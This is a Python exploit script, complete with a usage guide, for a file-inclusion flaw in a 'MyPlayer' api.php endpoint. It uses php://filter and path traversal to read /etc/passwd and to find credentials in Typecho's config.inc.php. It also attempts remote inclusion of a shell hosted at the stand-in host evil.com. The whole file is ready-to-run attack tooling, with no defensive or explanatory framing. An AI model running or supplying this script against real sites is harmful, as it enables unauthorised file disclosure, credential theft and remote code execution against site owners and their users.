#!/usr/bin/env python3
"""
MyPlayer File Inclusion Exploit
CVSS: 8.5 High

Target: MyPlayer/api.php
Vulnerability: Local File Inclusion / Remote File Inclusion

Requirements:
    pip install requests

Usage:
    python3 myplayer_lfi.py <api_url> [action] [file]

Actions:
    scan    - Scan for valid API classes (default)
    read    - Read local file
    rfi     - Remote file inclusion

Examples:
    python3 myplayer_lfi.py http://target/MyPlayer/api.php scan
    python3 myplayer_lfi.py http://target/MyPlayer/api.php read /etc/passwd
    python3 myplayer_lfi.py http://target/MyPlayer/api.php rfi http://evil.com/shell.txt
"""

import requests
import sys

class MyPlayerFileInclusion:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def scan_api_classes(self):
        """Scan for available API classes"""
        print("[*] Scanning for valid API classes...")
        
        known_apis = ['iqiyi', 'lyric', 'sina', '../Plugin']
        
        for api in known_apis:
            try:
                r = self.session.get(self.target, params={'service': api}, timeout=10)
                
                # Check response
                if r.status_code == 200:
                    if 'class' in r.text.lower() or 'fatal' in r.text.lower():
                        print(f"[+] Found valid class: {api}")
                    elif 'error' not in r.text.lower():
                        print(f"[+] Possible include: {api} (response: {len(r.text)} bytes)")
            except Exception as e:
                print(f"[-] Error with {api}: {e}")
        
        print("\n[*] Scan complete")
    
    def test_lfi(self, filepath):
        """Test Local File Inclusion via php://filter"""
        print(f"[*] Testing LFI with: {filepath}")
        
        filters = [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
        ]
        
        for filter_uri in filters:
            payload = filter_uri + filepath
            print(f"\n[*] Trying: {payload}")
            
            try:
                r = self.session.get(self.target, params={'service': payload}, timeout=10)
                
                if r.text and len(r.text) > 0:
                    print(f"[+] Got response: {len(r.text)} bytes")
                    
                    # Try to decode base64
                    try:
                        import base64
                        decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
                        if decoded and len(decoded) > 10:
                            print(f"[+] DECODED CONTENT:")
                            print(decoded[:500])
                            return decoded
                    except Exception as e:
                        print(f"[-] Decode error: {e}")
                        # Show raw response if decode fails
                        if r.text and len(r.text) > 20:
                            print(f"[+] Raw response: {r.text[:200]}...")
                            
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return None
    
    def test_rfi(self, shell_url):
        """Test Remote File Inclusion"""
        print(f"[*] Testing RFI: {shell_url}")
        
        try:
            r = self.session.get(self.target, params={'service': shell_url}, timeout=15)
            
            if r.status_code == 200:
                print(f"[+] RFI possible! Got response: {len(r.text)} bytes")
                if '<?php' in r.text or '<?=' in r.text:
                    print("[+] PHP code detected in response - RCE possible!")
                    return True
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return False
    
    def read_config(self):
        """Try to read Typecho config"""
        print("[*] Attempting to read Typecho config...")
        
        paths = [
            '../../../config.inc.php',
            '../../config.inc.php',
            '../config.inc.php',
            'config.inc.php',
        ]
        
        for path in paths:
            result = self.test_lfi(path)
            if result and 'password' in result.lower():
                print(f"[+] Found config with credentials!")
                return result
        
        return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <api.php_url> [action] [file]")
        print(f"Actions: scan (default), read, rfi")
        sys.exit(1)
    
    target = sys.argv[1]
    action = sys.argv[2] if len(sys.argv) > 2 else 'scan'
    
    exploit = MyPlayerFileInclusion(target)
    
    if action == 'scan':
        exploit.scan_api_classes()
    elif action == 'read':
        filepath = sys.argv[3] if len(sys.argv) > 3 else '/etc/passwd'
        exploit.test_lfi(filepath)
    elif action == 'rfi':
        shell_url = sys.argv[3] if len(sys.argv) > 3 else 'http://evil.com/shell.txt'
        exploit.test_rfi(shell_url)
    elif action == 'config':
        exploit.read_config()
    else:
        print(f"[-] Unknown action: {action}")

if __name__ == "__main__":
    main()
